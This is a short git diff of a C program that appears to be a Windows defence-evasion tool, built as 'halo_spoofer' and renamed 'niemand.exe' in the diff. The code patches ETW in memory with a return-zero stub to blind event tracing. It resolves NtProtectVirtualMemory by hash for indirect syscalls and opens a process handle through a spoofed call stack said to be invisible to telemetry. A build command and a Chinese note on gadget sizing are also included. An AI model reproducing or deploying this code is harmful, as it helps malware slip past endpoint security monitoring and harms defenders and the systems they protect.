@@ -136,12 +136,12 @@ int main() {
             etwAddrArray[0] = 0x33;
             etwAddrArray[1] = 0xC0;
             etwAddrArray[2] = 0xC3;
-            printf("[*] Overwrite done!\n");
+            printf("[*] Overwrite done, the ETW is blind now\n");
 
             //再次调用切回只读
             NTSTATUS status2 = VEGA_CALL((djb2_hash_a("NtProtectVirtualMemory")), 5, ((HANDLE)-1), &targetAddr, &modSize, oldProtect, &oldProtect);
             if(status2 == 0x00000000){
-                printf("[*] Changed back to R...");
+                printf("[*] Changed back to R...\n");
             }
         }
     }
@@ -162,8 +162,8 @@ int main() {
     cid.UniqueProcess = (HANDLE)(ULONG_PTR)GetCurrentProcessId(); 
     NTSTATUS status = VEGA_CALL(0x5003c058, 4, &hTargetProcess, PROCESS_ALL_ACCESS, &oa, &cid);
     if (status == 0x00000000) {
-        printf("[+] MASTERPIECE! Successfully got handle: 0x%p\n", hTargetProcess);
-        printf("[+] This call was completely invisible to Call Stack Telemetry.\n");
+        printf("[+] Successfully got handle: 0x%p\n", hTargetProcess);
+        printf("[+] You've killed the game champ!!!\n");
     } else {
         printf("[-] Misfire! System call failed with status: 0x%08X\n", status);
     }
@@ -171,7 +171,7 @@ int main() {
     return 0;
 }
 
-//x86_64-w64-mingw32-gcc -I include src/main.c src/halo_gate.c src/spoof.c asm/gate.s -o halo_spoofer.exe -m64 -static -w
+//x86_64-w64-mingw32-gcc -I include src/main.c src/halo_gate.c src/spoof.c asm/gate.s -o niemand.exe -m64 -static -w
 
 /*
 如果你要搬运 N 个参数，你寻找的傀儡 Gadget 的 size 必须大于 0x20 + (N * 8) 字节。 
